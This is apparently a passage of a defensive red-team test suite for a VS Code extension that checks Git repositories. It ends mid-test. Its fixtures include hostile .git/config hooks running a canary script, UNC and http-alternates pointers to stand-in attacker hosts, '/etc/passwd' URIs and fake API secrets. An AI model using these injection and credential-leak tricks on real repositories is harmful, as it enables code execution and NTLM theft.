/**
 * src/test/v06_redteam_hardening_runner.ts
 *
 * Red-Team Security & Gate-Evasion Regression Suite (`RT-01` .. `RT-10`)
 * + Public `0.1.0` vs Local `0.6.0` Version Separation Audit.
 *
 * Runs deterministically on both Windows (`win32-x64`) and Linux (`linux-x64` Docker / WSL2).
 */

import * as assert from "assert";
import * as cp from "child_process";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import Module = require("module");
import {
  buildSanitizedStaticEnv,
  ensureControlledEmptyDirectory,
  HostEnvironmentDescriptor,
  isDangerousUncOrDevicePath,
  verifyLaunchAdmission,
  verifyRepositoryGitMetadataSafety,
  verifyWindowsNativeExecutableIdentity,
} from "../runtime/admission";
import {
  getTotalBrokerSpawnCount,
  resetTotalBrokerSpawnCountForTests,
} from "../runtime/windowsBroker";
import { sanitizeUntrustedDisplayString } from "../core/sourceIdentity";
import {
  formatProvePlanConfirmationDetails,
  PreparedProveExecutionPlanFields,
} from "../core/replayBuilder";
import { PINNED_PROVE_CATALOGUE_VERSION, PINNED_PROVE_GENERATOR_SHA256 } from "../core/proveModel";
import { authorizeClipboardCopy, buildContextDietDiff } from "../engine/contextDiet";
import { CheckwashLensController } from "../ui/commands";
import {
  ACTIVE_PLATFORM,
  ACTIVE_VSIX_TARGET,
  getPlatformExecutionMetadata,
  IS_WIN32,
  resolveBundledBrokerFilename,
  resolvePlatformEvidenceDir,
  resolveTestGitExe,
  resolveTestPythonExe,
} from "./testPlatformEnv";

const REPO_ROOT = path.resolve(__dirname, "..", "..");
const EVIDENCE_DIR = resolvePlatformEvidenceDir(REPO_ROOT);
const RESULTS_FILE = path.join(EVIDENCE_DIR, "v06-redteam-hardening-results.json");

const PYTHON_EXE = resolveTestPythonExe();
const GIT_EXE = resolveTestGitExe();

interface RedTeamCaseResult {
  id: string;
  name: string;
  passed: boolean;
  durationMs: number;
  details: Record<string, unknown>;
  error?: string;
}

function runGit(repoDir: string, args: string[]): string {
  const res = cp.spawnSync(GIT_EXE, ["-C", repoDir, ...args], {
    encoding: "utf8",
    windowsHide: true,
  });
  if (res.status !== 0) {
    throw new Error(
      `git ${args.join(" ")} failed (exit=${res.status}): ${res.stderr || res.stdout}`
    );
  }
  return (res.stdout || "").trim();
}

function initTwoCommitRepo(baseTempDir: string, folderName: string): {
  repoDir: string;
  baseOid: string;
  headOid: string;
} {
  const repoDir = path.join(baseTempDir, folderName);
  fs.mkdirSync(repoDir, { recursive: true });
  runGit(repoDir, ["init", "-b", "main"]);
  runGit(repoDir, ["config", "user.name", "RedTeam Tester"]);
  runGit(repoDir, ["config", "user.email", "redteam@example.invalid"]);
  runGit(repoDir, ["config", "commit.gpgsign", "false"]);

  fs.mkdirSync(path.join(repoDir, "src"), { recursive: true });
  fs.mkdirSync(path.join(repoDir, "tests"), { recursive: true });
  fs.writeFileSync(
    path.join(repoDir, "src", "calc.py"),
    "def add(a: int, b: int) -> int:\n    return a + b\n",
    "utf8"
  );
  fs.writeFileSync(
    path.join(repoDir, "tests", "test_calc.py"),
    "from src.calc import add\n\ndef test_add() -> None:\n    assert add(2, 3) == 5\n",
    "utf8"
  );
  runGit(repoDir, ["add", "."]);
  runGit(repoDir, ["commit", "-m", "chore: initial commit"]);
  const baseOid = runGit(repoDir, ["rev-parse", "HEAD"]);

  fs.writeFileSync(
    path.join(repoDir, "src", "calc.py"),
    "def add(a: int, b: int) -> int:\n    return a + b\n\ndef mul(a: int, b: int) -> int:\n    return a * b\n",
    "utf8"
  );
  fs.writeFileSync(
    path.join(repoDir, "tests", "test_calc.py"),
    "from src.calc import add, mul\n\ndef test_add() -> None:\n    assert add(2, 3) == 5\n    assert mul(2, 4) == 8\n",
    "utf8"
  );
  runGit(repoDir, ["add", "."]);
  runGit(repoDir, ["commit", "-m", "feat: add mul with assertion"]);
  const headOid = runGit(repoDir, ["rev-parse", "HEAD"]);
  return { repoDir, baseOid, headOid };
}

function makeTrustedHostDesc(repoRoot: string): HostEnvironmentDescriptor {
  return {
    isWorkspaceTrusted: true,
    platform: process.platform,
    arch: process.arch,
    workspaceScheme: "file",
    isRemote: false,
    remoteName: null,
    isVirtualWorkspace: false,
    extensionRootPath: REPO_ROOT,
    repositoryRootPath: repoRoot,
    configuredPythonPath: PYTHON_EXE,
    configuredGitPath: GIT_EXE,
    inheritedEnv: process.env,
  };
}

function encodeNulSeparatedBase64(items: string[]): string {
  if (items.length === 0) {
    return "";
  }
  const parts: Buffer[] = [];
  for (const item of items) {
    parts.push(Buffer.from(item, "utf8"), Buffer.from([0]));
  }
  return Buffer.concat(parts).toString("base64");
}

function readZipEntries(zipBuf: Buffer): string[] {
  let eocdOffset = -1;
  for (let i = zipBuf.length - 22; i >= Math.max(0, zipBuf.length - 65557); i--) {
    if (zipBuf.readUInt32LE(i) === 0x06054b50) {
      eocdOffset = i;
      break;
    }
  }
  if (eocdOffset < 0) {
    throw new Error("Invalid ZIP: EOCD not found");
  }
  const total = zipBuf.readUInt16LE(eocdOffset + 10);
  let cursor = zipBuf.readUInt32LE(eocdOffset + 16);
  const out: string[] = [];
  for (let i = 0; i < total; i++) {
    const nameLen = zipBuf.readUInt16LE(cursor + 28);
    const extraLen = zipBuf.readUInt16LE(cursor + 30);
    const commentLen = zipBuf.readUInt16LE(cursor + 32);
    out.push(zipBuf.subarray(cursor + 46, cursor + 46 + nameLen).toString("utf8"));
    cursor += 46 + nameLen + extraLen + commentLen;
  }
  return out;
}

// ============================================================================
// Minimal Programmable VS Code Harness for Extension Entry-Point Tests
// ============================================================================

interface MockVscodeHarness {
  isTrusted: boolean;
  workspaceFolders: Array<{ name: string; uri: { scheme: string; fsPath: string; toString(): string } }>;
  registeredCommands: Map<string, (...args: unknown[]) => unknown>;
  quickPickCallCount: number;
  openTextDocumentUris: string[];
  globalConfigWrites: Array<{ key: string; value: unknown; target: unknown }>;
  errorMessages: string[];
  warningMessages: string[];
  infoMessages: string[];
  nextInfoChoice: string | undefined;
  restore(): void;
}

function installMockVscodeHarness(initialRepoRoot: string, initialTrusted: boolean): MockVscodeHarness {
  const registeredCommands = new Map<string, (...args: unknown[]) => unknown>();
  const openTextDocumentUris: string[] = [];
  const globalConfigWrites: Array<{ key: string; value: unknown; target: unknown }> = [];
  const errorMessages: string[] = [];
  const warningMessages: string[] = [];
  const infoMessages: string[] = [];

  const makeFileUri = (fsPath: string) => ({
    scheme: "file",
    authority: "",
    path: fsPath.replace(/\\/g, "/"),
    query: "",
    fragment: "",
    fsPath,
    toString: () => `file://${fsPath.replace(/\\/g, "/")}`,
  });

  const parseUri = (raw: string) => {
    const m = /^([a-zA-Z0-9+.-]+):(?:\/\/([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?$/.exec(raw);
    const scheme = m ? m[1].toLowerCase() : "unknown";
    const authority = m && m[2] ? m[2] : "";
    const uriPath = m && m[3] ? m[3] : raw;
    const query = m && m[4] ? m[4] : "";
    const fragment = m && m[5] ? m[5] : "";
    return {
      scheme,
      authority,
      path: uriPath,
      query,
      fragment,
      fsPath: uriPath,
      toString: () => raw,
    };
  };

  class MockEventEmitter<T> {
    private listeners: Array<(e: T) => void> = [];
    public readonly event = (listener: (e: T) => void) => {
      this.listeners.push(listener);
      return { dispose: () => {} };
    };
    public fire(data: T): void {
      for (const l of this.listeners) l(data);
    }
    public dispose(): void {
      this.listeners = [];
    }
  }

  const state: MockVscodeHarness = {
    isTrusted: initialTrusted,
    workspaceFolders: initialRepoRoot
      ? [{ name: path.basename(initialRepoRoot), uri: makeFileUri(initialRepoRoot) }]
      : [],
    registeredCommands,
    quickPickCallCount: 0,
    openTextDocumentUris,
    globalConfigWrites,
    errorMessages,
    warningMessages,
    infoMessages,
    nextInfoChoice: undefined,
    restore: () => {},
  };

  const mockVscode = {
    Uri: { file: makeFileUri, parse: parseUri },
    EventEmitter: MockEventEmitter,
    Disposable: class {
      public dispose(): void {}
    },
    ThemeColor: class {
      constructor(public readonly id: string) {}
    },
    ThemeIcon: class {
      constructor(public readonly id: string, public readonly color?: unknown) {}
    },
    TreeItemCollapsibleState: { None: 0, Collapsed: 1, Expanded: 2 },
    TreeItem: class {
      public label: unknown;
      public collapsibleState: number;
      constructor(label: unknown, collapsibleState: number = 0) {
        this.label = label;
        this.collapsibleState = collapsibleState;
      }
    },
    DiagnosticSeverity: { Error: 0, Warning: 1, Information: 2, Hint: 3 },
    Diagnostic: class {
      constructor(
        public readonly range: unknown,
        public readonly message: string,
        public readonly severity: number
      ) {}
    },
    Position: class {
      constructor(public readonly line: number, public readonly character: number) {}
    },
    Range: class {
      constructor(
        public readonly startLine: number,
        public readonly startChar: number,
        public readonly endLine?: number,
        public readonly endChar?: number
      ) {}
    },
    Selection: class {
      constructor(public readonly anchor: unknown, public readonly active: unknown) {}
    },
    TextEditorRevealType: { InCenter: 2 },
    StatusBarAlignment: { Left: 1, Right: 2 },
    ProgressLocation: { Notification: 15 },
    ConfigurationTarget: { Global: 1, Workspace: 2, WorkspaceFolder: 3 },
    Hover: class {
      constructor(public readonly contents: unknown) {}
    },
    env: {
      remoteName: undefined,
      clipboard: { writeText: async () => {} },
    },
    workspace: {
      get isTrusted() {
        return state.isTrusted;
      },
      get workspaceFolders() {
        return state.workspaceFolders;
      },
      textDocuments: [],
      getConfiguration: () => ({
        inspect: () => ({
          globalValue: undefined,
          workspaceValue: undefined,
          workspaceFolderValue: undefined,
        }),
        get: (_k: string, defVal?: unknown) => defVal,
        update: async (key: string, value: unknown, target: unknown) => {
          globalConfigWrites.push({ key, value, target });
        },
      }),
      registerTextDocumentContentProvider: () => ({ dispose: () => {} }),
      onDidChangeTextDocument: () => ({ dispose: () => {} }),
      onDidOpenTextDocument: () => ({ dispose: () => {} }),
      onDidCloseTextDocument: () => ({ dispose: () => {} }),
      onDidSaveTextDocument: () => ({ dispose: () => {} }),
      onDidChangeWorkspaceFolders: () => ({ dispose: () => {} }),
      onDidGrantWorkspaceTrust: () => ({ dispose: () => {} }),
      onDidChangeConfiguration: () => ({ dispose: () => {} }),
      openTextDocument: async (uri: { toString(): string }) => {
        const s = typeof uri === "string" ? uri : uri.toString();
        openTextDocumentUris.push(s);
        return { uri, getText: () => "" };
      },
    },
    languages: {
      createDiagnosticCollection: () => ({
        clear: () => {},
        set: () => {},
        dispose: () => {},
      }),
      registerHoverProvider: () => ({ dispose: () => {} }),
    },
    window: {
      createStatusBarItem: () => ({
        text: "",
        tooltip: "",
        command: undefined,
        backgroundColor: undefined,
        show: () => {},
        dispose: () => {},
      }),
      createTreeView: () => ({ dispose: () => {} }),
      registerTreeDataProvider: () => ({ dispose: () => {} }),
      withProgress: async (_opts: unknown, task: (p: unknown, t: unknown) => Promise<unknown>) =>
        task({ report: () => {} }, { isCancellationRequested: false, onCancellationRequested: () => ({ dispose: () => {} }) }),
      showQuickPick: async () => {
        state.quickPickCallCount++;
        return undefined;
      },
      showInputBox: async () => undefined,
      showOpenDialog: async () => undefined,
      showTextDocument: async (doc: unknown) => ({
        document: doc,
        selection: undefined,
        revealRange: () => {},
      }),
      showErrorMessage: async (msg: string) => {
        errorMessages.push(msg);
        return undefined;
      },
      showWarningMessage: async (msg: string) => {
        warningMessages.push(msg);
        return undefined;
      },
      showInformationMessage: async (msg: string) => {
        infoMessages.push(msg);
        return state.nextInfoChoice;
      },
    },
    commands: {
      registerCommand: (id: string, cb: (...args: unknown[]) => unknown) => {
        registeredCommands.set(id, cb);
        return { dispose: () => registeredCommands.delete(id) };
      },
      executeCommand: async (id: string, ...args: unknown[]) => {
        const fn = registeredCommands.get(id);
        if (!fn) {
          throw new Error(`Command not registered: ${id}`);
        }
        return fn(...args);
      },
    },
  };

  const modAny = Module as unknown as {
    _load: (request: string, parent: unknown, isMain: boolean) => unknown;
  };
  const origLoad = modAny._load;
  modAny._load = function (request: string, parent: unknown, isMain: boolean): unknown {
    if (request === "vscode") {
      return mockVscode;
    }
    return origLoad.call(this, request, parent, isMain);
  };

  state.restore = () => {
    modAny._load = origLoad;
  };
  return state;
}

// ============================================================================
// RT-01: Git Pointer UNC/Escape Block & Restricted Mode Zero `.git` Probe
// ============================================================================

async function testRt01GitPointerAndRestrictedZeroProbe(
  tempRoot: string
): Promise<Record<string, unknown>> {
  // 1. UNC / device path detection
  assert.strictEqual(isDangerousUncOrDevicePath("\\\\evil-attacker.invalid\\share\\git"), true);
  assert.strictEqual(isDangerousUncOrDevicePath("//evil-attacker.invalid/share/git"), true);
  assert.strictEqual(isDangerousUncOrDevicePath("\\\\?\\UNC\\evil\\share"), true);

  // 2. Hostile `.git` pointer file targeting UNC share -> rejected before touching network
  const uncRepo = path.join(tempRoot, "rt01-unc-pointer");
  fs.mkdirSync(uncRepo, { recursive: true });
  fs.writeFileSync(
    path.join(uncRepo, ".git"),
    "gitdir: \\\\evil-attacker.invalid\\smb-ntlm-leak\\repo\n",
    "utf8"
  );
  const uncSafety = verifyRepositoryGitMetadataSafety(uncRepo);
  assert.strictEqual(uncSafety.ok, false, "UNC gitdir pointer must be rejected");

  // 3. Hostile `.git` pointer file targeting an existing outside non-Git directory
  const outsideNonGitDir = path.join(tempRoot, "rt01-outside-non-git");
  fs.mkdirSync(outsideNonGitDir, { recursive: true });
  fs.writeFileSync(path.join(outsideNonGitDir, "HEAD"), "not-a-git-dir-without-objects\n", "utf8");
  const escapeRepo = path.join(tempRoot, "rt01-escape-pointer");
  fs.mkdirSync(escapeRepo, { recursive: true });
  fs.writeFileSync(path.join(escapeRepo, ".git"), `gitdir: ${outsideNonGitDir}\n`, "utf8");
  const escapeSafety = verifyRepositoryGitMetadataSafety(escapeRepo);
  assert.strictEqual(
    escapeSafety.ok,
    false,
    "gitdir pointer targeting non-Git directory outside repo must be rejected"
  );

  // 4. Restricted Mode zero `.git` probe + entry-point `scanCommittedRange()` / `scanUncommittedSnapshot()`
  const { repoDir } = initTwoCommitRepo(tempRoot, "rt01-real-repo");
  runGit(repoDir, ["checkout", "-b", "feat/rt01-check"]);

  const harness = installMockVscodeHarness(repoDir, false);
  const extModulePath = require.resolve("../extension");
  delete require.cache[extModulePath];
  resetTotalBrokerSpawnCountForTests();

  try {
    const ext = require("../extension") as typeof import("../extension");
    const untrustedPresets = ext.collectSmartGitRangePresetsZeroProcess(repoDir, {
      isWorkspaceTrusted: false,
    });
    assert.strictEqual(
      untrustedPresets.some((p) => p.rangeSpec === "main...HEAD"),
      false,
      "Restricted Mode must not probe .git branch refs"
    );

    const trustedPresets = ext.collectSmartGitRangePresetsZeroProcess(repoDir, {
      isWorkspaceTrusted: true,
    });
    assert.strictEqual(
      trustedPresets.some(
        (p) => p.rangeSpec === "main...HEAD" && p.description.includes("feat/rt01-check")
      ),
      true,
      "Trusted Mode should still offer smart branch presets on legitimate repo"
    );

    const uncPresets = ext.collectSmartGitRangePresetsZeroProcess(uncRepo, {
      isWorkspaceTrusted: true,
    });
    assert.strictEqual(uncPresets.length, 3, "UNC pointer repo must fall back to 3 static presets");

    const ctx = {
      subscriptions: [] as Array<{ dispose(): void }>,
      extensionPath: REPO_ROOT,
    } as unknown as import("vscode").ExtensionContext;
    ext.activate(ctx);

    // Invoke without rangeArg / modeArg in Restricted Mode: must NOT call showQuickPick or spawn processes!
    const committedSnap = (await harness.registeredCommands.get(
      "checkwashLens.scanCommittedRange"
    )!()) as { evaluatedState: { state: string; notRunReason?: string } };
    const precheckSnap = (await harness.registeredCommands.get(
      "checkwashLens.scanUncommittedSnapshot"
    )!()) as { evaluatedState: { state: string; notRunReason?: string } };

    assert.strictEqual(harness.quickPickCallCount, 0, "Zero QuickPick prompts in Restricted Mode");
    assert.strictEqual(committedSnap.evaluatedState.state, "Not Run");
    assert.strictEqual((committedSnap.evaluatedState.notRunReason ?? "").includes("Restricted Mode"), true);
    assert.strictEqual(precheckSnap.evaluatedState.state, "Not Run");
    assert.strictEqual((precheckSnap.evaluatedState.notRunReason ?? "").includes("Restricted Mode"), true);
    assert.strictEqual(getTotalBrokerSpawnCount(), 0, "Zero broker spawns in Restricted Mode");
    await ext.deactivate();
  } finally {
    delete require.cache[extModulePath];
    harness.restore();
  }

  return {
    uncSafetyRejected: !uncSafety.ok,
    escapeSafetyRejected: !escapeSafety.ok,
    restrictedQuickPickCalls: 0,
    restrictedSpawns: 0,
  };
}

// ============================================================================
// RT-02: `.git/config` Hook/Fsmonitor Neutralization, Symlinked Index & Alternates
// ============================================================================

async function testRt02GitConfigHooksSymlinkIndexAndAlternates(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const { repoDir } = initTwoCommitRepo(tempRoot, "rt02-hostile-gitconfig");
  const canaryFile = path.join(tempRoot, "rt02-pwned-canary.txt");
  const canaryScript = path.join(tempRoot, IS_WIN32 ? "evil_hook.cmd" : "evil_hook.sh");
  if (IS_WIN32) {
    fs.writeFileSync(canaryScript, `@echo PWNED > "${canaryFile}"\r\n@exit /b 0\r\n`, "utf8");
  } else {
    fs.writeFileSync(canaryScript, `#!/bin/sh\necho PWNED > "${canaryFile}"\nexit 0\n`, {
      encoding: "utf8",
      mode: 0o755,
    });
  }

  // Inject hostile core.fsmonitor, core.pager, and core.sshCommand directly into <repo>/.git/config
  const gitConfigPath = path.join(repoDir, ".git", "config");
  const escapedCanaryCmd = canaryScript.replace(/\\/g, "/");
  fs.appendFileSync(
    gitConfigPath,
    [
      "",
      "[core]",
      `\tfsmonitor = "${escapedCanaryCmd}"`,
      `\tpager = "${escapedCanaryCmd}"`,
      `\tsshCommand = "${escapedCanaryCmd}"`,
      "",
    ].join("\n"),
    "utf8"
  );

  // Run BOTH real committed scan AND real uncommitted worktree pre-check!
  const controller = new CheckwashLensController();
  const hostDesc = makeTrustedHostDesc(repoDir);
  try {
    const committedSnap = await controller.scanCommittedRange(hostDesc, "HEAD~1..HEAD", []);
    assert.strictEqual(
      committedSnap.evaluatedState.state,
      "Pass",
      `Expected Pass despite hostile .git/config, got ${committedSnap.evaluatedState.state} (${committedSnap.evaluatedState.errorReason ?? ""})`
    );
    // Add a clean uncommitted change on disk so worktree pre-check runs full Git plumbing + Checkwash
    fs.appendFileSync(
      path.join(repoDir, "src", "calc.py"),
      "\ndef sub(a: int, b: int) -> int:\n    return a - b\n",
      "utf8"
    );
    fs.appendFileSync(
      path.join(repoDir, "tests", "test_calc.py"),
      "\n    assert add(10, 5) == 15\n",
      "utf8"
    );
    const worktreeSnap = await controller.scanUncommittedSnapshot(hostDesc, "worktree", []);
    assert.strictEqual(worktreeSnap.evaluatedState.state, "Pass");
    assert.strictEqual(
      fs.existsSync(canaryFile),
      false,
      "CRITICAL: .git/config fsmonitor/pager/sshCommand executed during scan!"
    );
  } finally {
    controller.dispose();
  }

  // Verify `objects/info/http-alternates` is rejected fail-closed
  const httpAltRepo = initTwoCommitRepo(tempRoot, "rt02-http-alternates").repoDir;
  const infoDir = path.join(httpAltRepo, ".git", "objects", "info");
  fs.mkdirSync(infoDir, { recursive: true });
  fs.writeFileSync(path.join(infoDir, "http-alternates"), "http://evil.invalid/git/objects\n", "utf8");
  const httpAltCheck = verifyRepositoryGitMetadataSafety(httpAltRepo);
  assert.strictEqual(httpAltCheck.ok, false, "http-alternates must be rejected");

  // Verify escaping `objects/info/alternates` is rejected fail-closed
  const escAltRepo = initTwoCommitRepo(tempRoot, "rt02-escape-alternates").repoDir;
  const escInfoDir = path.join(escAltRepo, ".git", "objects", "info");
  fs.mkdirSync(escInfoDir, { recursive: true });
  fs.writeFileSync(path.join(escInfoDir, "alternates"), "../../../../outside-objects\n", "utf8");
  const escAltCheck = verifyRepositoryGitMetadataSafety(escAltRepo);
  assert.strictEqual(escAltCheck.ok, false, "Escaping alternates outside repo must be rejected");
  const escAdmission = verifyLaunchAdmission(makeTrustedHostDesc(escAltRepo));
  assert.strictEqual(escAdmission.ok, false, "verifyLaunchAdmission must block escaping alternates");

  // Verify symlinked `.git/index` is rejected when OS allows creating file symlinks
  let symlinkIndexTested = false;
  const symRepo = initTwoCommitRepo(tempRoot, "rt02-symlink-index").repoDir;
  const realIdx = path.join(symRepo, ".git", "index");
  const movedIdx = path.join(tempRoot, "rt02-moved-index");
  fs.renameSync(realIdx, movedIdx);
  try {
    fs.symlinkSync(movedIdx, realIdx, "file");
    symlinkIndexTested = true;
  } catch {
    // Unprivileged Windows without Developer Mode may disallow file symlinks; Linux always exercises this
  }
  if (symlinkIndexTested) {
    const symCheck = verifyRepositoryGitMetadataSafety(symRepo);
    assert.strictEqual(symCheck.ok, false, "Symlinked .git/index must be rejected");
  }

  return {
    canaryExecuted: fs.existsSync(canaryFile),
    httpAlternatesBlocked: !httpAltCheck.ok,
    escapingAlternatesBlocked: !escAltCheck.ok,
    symlinkIndexTested,
  };
}

// ============================================================================
// RT-03: Controlled Empty CWD (`0700` UID-Scoped + Squatting Fallback)
// ============================================================================

async function testRt03ControlledEmptyCwdIsolation(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const cwdPath = ensureControlledEmptyDirectory("checkwash-lens-rt03-clean");
  const st = fs.lstatSync(cwdPath);
  assert.strictEqual(st.isSymbolicLink(), false);
  assert.strictEqual(st.isDirectory(), true);

  let posixModeOctal: string | null = null;
  let symlinkSquatFallbackVerified = false;

  if (!IS_WIN32 && typeof process.getuid === "function") {
    const mode = st.mode & 0o777;
    posixModeOctal = mode.toString(8);
    assert.strictEqual(mode, 0o700, `Expected 0700 mode on POSIX controlled cwd, got 0${posixModeOctal}`);
    assert.strictEqual(st.uid, process.getuid());

    // Pre-plant a symlink at the predictable name and verify fallback to isolated mkdtemp 0700 dir
    const squatSubName = `checkwash-lens-rt03-squat-${process.pid}`;
    const predictablePath = path.join(os.tmpdir(), `${squatSubName}-${process.getuid()}`);
    try {
      fs.rmSync(predictablePath, { recursive: true, force: true });
    } catch {
      // ignore
    }
    const decoyTarget = path.join(tempRoot, "rt03-decoy");
    fs.mkdirSync(decoyTarget, { recursive: true });
    fs.symlinkSync(decoyTarget, predictablePath);
    try {
      const fallbackCwd = ensureControlledEmptyDirectory(squatSubName);
      assert.notStrictEqual(fallbackCwd, predictablePath, "Must not use symlink-squatted predictable directory");
      const fbStat = fs.lstatSync(fallbackCwd);
      assert.strictEqual(fbStat.isSymbolicLink(), false);
      assert.strictEqual(fbStat.mode & 0o777, 0o700);
      symlinkSquatFallbackVerified = true;
      fs.rmSync(fallbackCwd, { recursive: true, force: true });
    } finally {
      fs.rmSync(predictablePath, { recursive: true, force: true });
    }
  }

  const staticEnv = buildSanitizedStaticEnv({
    canonicalGitDir: path.dirname(GIT_EXE),
    controlledEmptyCwd: cwdPath,
    inheritedEnv: process.env,
    platform: process.platform,
  });
  assert.strictEqual(staticEnv.GIT_CONFIG_COUNT, "5");
  assert.strictEqual(staticEnv.GIT_CONFIG_KEY_1, "core.hooksPath");
  assert.strictEqual(staticEnv.GIT_CONFIG_VALUE_1, cwdPath);
  if (IS_WIN32) {
    assert.strictEqual(staticEnv.NoDefaultCurrentDirectoryInExePath, "1");
  }

  return {
    cwdPath,
    posixModeOctal,
    symlinkSquatFallbackVerified,
    gitConfigCount: staticEnv.GIT_CONFIG_COUNT,
  };
}

// ============================================================================
// RT-04: Windows `.bat` / `.cmd` / Non-PE Executable Rejection
// ============================================================================

async function testRt04WindowsBatchShimAndNonPeRejection(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const shimDir = path.join(tempRoot, "rt04-shims");
  fs.mkdirSync(shimDir, { recursive: true });
  const fakePyCmd = path.join(shimDir, "python.cmd");
  const fakeGitBat = path.join(shimDir, "git.bat");
  const fakeProveCmd = path.join(shimDir, "checkwash-prove.cmd");
  const fakeTextExe = path.join(shimDir, "not-a-pe.exe");

  fs.writeFileSync(fakePyCmd, "@echo off\r\necho Python 3.12.0\r\n", "utf8");
  fs.writeFileSync(fakeGitBat, "@echo off\r\necho git version 2.47.0\r\n", "utf8");
  fs.writeFileSync(fakeProveCmd, "@echo off\r\necho checkwash-prove 0.1.0\r\n", "utf8");
  fs.writeFileSync(fakeTextExe, "This is ASCII text pretending to be an .exe without MZ header", "utf8");

  assert.strictEqual(verifyWindowsNativeExecutableIdentity(fakePyCmd, "pythonPath").ok, false);
  assert.strictEqual(verifyWindowsNativeExecutableIdentity(fakeGitBat, "gitPath").ok, false);
  assert.strictEqual(verifyWindowsNativeExecutableIdentity(fakeProveCmd, "provePath").ok, false);
  assert.strictEqual(verifyWindowsNativeExecutableIdentity(fakeTextExe, "pythonPath").ok, false);

  let winAdmissionBlocked = false;
  if (IS_WIN32) {
    // Valid real PE (`python.exe` and `git.exe`) must pass
    assert.strictEqual(verifyWindowsNativeExecutableIdentity(PYTHON_EXE, "pythonPath").ok, true);
    assert.strictEqual(verifyWindowsNativeExecutableIdentity(GIT_EXE, "gitPath").ok, true);

    const { repoDir } = initTwoCommitRepo(tempRoot, "rt04-win-repo");
    resetTotalBrokerSpawnCountForTests();
    const badPyAdm = verifyLaunchAdmission({
      ...makeTrustedHostDesc(repoDir),
      configuredPythonPath: fakePyCmd,
    });
    const badPeAdm = verifyLaunchAdmission({
      ...makeTrustedHostDesc(repoDir),
      configuredPythonPath: fakeTextExe,
    });
    assert.strictEqual(badPyAdm.ok, false);
    assert.strictEqual(badPeAdm.ok, false);

    const controller = new CheckwashLensController();
    try {
      const badProvePlan = await controller.prepareProveManualCommandPlan({
        hostDesc: makeTrustedHostDesc(repoDir),
        configuredProvePath: fakeProveCmd,
        rawRangeSpec: "HEAD~1..HEAD",
        entryKind: "list",
      });
      assert.strictEqual(badProvePlan.ok, false);
      assert.strictEqual(
        badProvePlan.ok ? "" : badProvePlan.error.includes(".exe"),
        true,
        "Prove preflight must reject .cmd batch shim"
      );
    } finally {
      controller.dispose();
    }
    winAdmissionBlocked = true;
  }

  return {
    rejectedCmdShim: true,
    rejectedBatShim: true,
    rejectedNonPeExe: true,
    winAdmissionBlocked,
  };
}

// ============================================================================
// RT-05: Command Argument Hardening (`runEnvironmentDoctor` & `openImmutableRevision`)
// ============================================================================

async function testRt05CommandArgumentHardening(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const { repoDir } = initTwoCommitRepo(tempRoot, "rt05-cmd-repo");
  const harness = installMockVscodeHarness(repoDir, true);
  const extModulePath = require.resolve("../extension");
  delete require.cache[extModulePath];

  try {
    const ext = require("../extension") as typeof import("../extension");
    const ctx = {
      subscriptions: [] as Array<{ dispose(): void }>,
      extensionPath: REPO_ROOT,
    } as unknown as import("vscode").ExtensionContext;
    ext.activate(ctx);

    // 1. Malicious task/command passing `{ autoApplyDiscoveredUserSettings: true, silentUi: true }`
    harness.nextInfoChoice = undefined; // User does NOT click "Save Verified Paths to User Settings"
    await harness.registeredCommands.get("checkwashLens.runEnvironmentDoctor")!({
      autoApplyDiscoveredUserSettings: true,
      silentUi: true,
    });
    await harness.registeredCommands.get("checkwashLens.runEnvironmentDoctor")!({
      autoApplyDiscoveredUserSettings: true,
    });
    assert.strictEqual(
      harness.globalConfigWrites.length,
      0,
      "Global User Settings must NEVER be modified without explicit user button click"
    );

    // 2. Malicious command passing `file:` / `vscode-vfs:` / malformed URIs to `openImmutableRevision`
    harness.openTextDocumentUris.length = 0;
    harness.errorMessages.length = 0;

    const r1 = await harness.registeredCommands.get("checkwashLens.openImmutableRevision")!(
      "file:///etc/passwd"
    );
    const r2 = await harness.registeredCommands.get("checkwashLens.openImmutableRevision")!(
      "vscode-vfs://github/attacker/repo/.env"
    );
    const r3 = await harness.registeredCommands.get("checkwashLens.openImmutableRevision")!(
      "checkwash-rev://not-a-valid-oid/path"
    );
    assert.strictEqual(r1, null);
    assert.strictEqual(r2, null);
    assert.strictEqual(r3, null);
    assert.strictEqual(
      harness.openTextDocumentUris.length,
      0,
      "openImmutableRevision must never call openTextDocument on non-checkwash-rev URIs"
    );
    assert.strictEqual(harness.errorMessages.length, 3);

    await ext.deactivate();
  } finally {
    delete require.cache[extModulePath];
    harness.restore();
  }

  return {
    globalConfigWritesWithoutClick: 0,
    blockedArbitraryOpenDocumentCalls: 3,
  };
}

// ============================================================================
// RT-06: Context Diet Quoted Git Paths, Deleted `.env`, and `.env`/YAML/Token Redaction
// ============================================================================

async function testRt06ContextDietQuotedPathsAndEnvYamlSecrets(): Promise<Record<string, unknown>> {
  const baseOid = "1111111111111111111111111111111111111111";
  const headOid = "2222222222222222222222222222222222222222";
  const secretEnvPw = "prod_DB_SuperSecret_9988776655";
  const secretStripe = "sk_live_51NxyzABCDEF1234567890abcdef";
  const secretAnthropic = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789";
  const secretYaml = "yaml_service_token_value_abcdef987654";
  const secretJwt =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

  const rawDiff = [
    'diff --git "a/my dir/.env.production" "b/my dir/.env.production"',
    "new file mode 100644",
    "index 0000000..1234567",
    "--- /dev/null",
    '+++ "b/my dir/.env.production"',
    "@@ -0,0 +1,2 @@",
    `+DATABASE_PASSWORD=${secretEnvPw}`,
    "+SAFE_FLAG=true",
    "diff --git a/.env b/.env",
    "deleted file mode 100644",
    "index 89abcdef..0000000",
    "--- a/.env",
    "+++ /dev/null",
    "@@ -1,1 +0,0 @@",
    `-STRIPE_API_KEY=${secretStripe}`,
    "diff --git a/config/service.yaml b/config/service.yaml",
    "index 2222222..3333333 100644",
    "--- a/config/service.yaml",
    "+++ b/config/service.yaml",
    "@@ -1,2 +1,5 @@",
    " service_name: checkout",
    `+client_secret: ${secretYaml}`,
    `+anthropic_key: ${secretAnthropic}`,
    `+session_jwt: ${secretJwt}`,
    "",
  ].join("\n");

